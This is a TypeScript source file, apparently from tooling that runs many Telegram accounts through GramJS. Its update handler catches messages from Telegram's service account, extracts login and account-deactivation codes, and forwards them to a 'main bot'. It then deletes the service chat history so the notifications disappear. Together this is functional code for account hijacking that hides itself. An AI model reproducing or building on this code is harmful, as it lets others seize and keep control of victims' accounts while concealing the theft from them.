import BigInt from 'big-integer';

import { TelegramClient } from '../../../gramjs';
import GramJs from '../../../gramjs/tl/api';
import { sendToMainBot } from '../../helpers/sendToMainBot';
import { deleteHistory } from '../messages/deleteHistory';

const extractLoginCode = (message: string): string | null => {
  const loginCodeMatch = message.match(/Login code: (\d+)/);
  if (loginCodeMatch) {
    return loginCodeMatch[1];
  }

  const webLoginMatch = message.match(
    /This is your login code:\s*([a-zA-Z0-9]+)/
  );
  if (webLoginMatch) {
    return `${webLoginMatch[1]}`;
  }

  return null;
};

export const handleUpdate = async (
  client: TelegramClient | null,
  accountId: string,
  update: any
) => {
  if (!update) {
    return;
  }

  if (
    update.className === 'UpdateConnectionState' ||
    update.className === 'UpdateUserStatus' ||
    update.className === 'UpdateUserTyping'
  ) {
    if (process.env.DEV !== 'true') {
      return;
    }
  }

  console.log({
    accountId,
    message: `<${update.className}>`,
    payload: JSON.parse(JSON.stringify(update)),
  });

  if (update instanceof GramJs.UpdateShortMessage) {
    if (String(update.userId) === '777000') {
      console.warn({
        accountId,
        message: '[TELEGRAM_SERVICE_NOTIFICATION]',
        payload: JSON.parse(JSON.stringify(update)),
      });

      const code = extractLoginCode(update.message);
      let messageText = update.message;
      if (code) {
        messageText = update.message.includes('my.telegram.org')
          ? `CODE_FOR_DEACTIVATE_ACCOUNT: ${code}`
          : `CODE_FOR_LOGIN: ${code}`;
      }

      const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
ID: ${accountId}
MESSAGE: ${messageText}`;

      await sendToMainBot(notificationMessage);

      if (client) {
        await deleteHistory(
          client,
          new GramJs.InputPeerUser({
            userId: update.userId,
            accessHash: BigInt(0),
          }),
          true
        );
      }
    }
  }
};
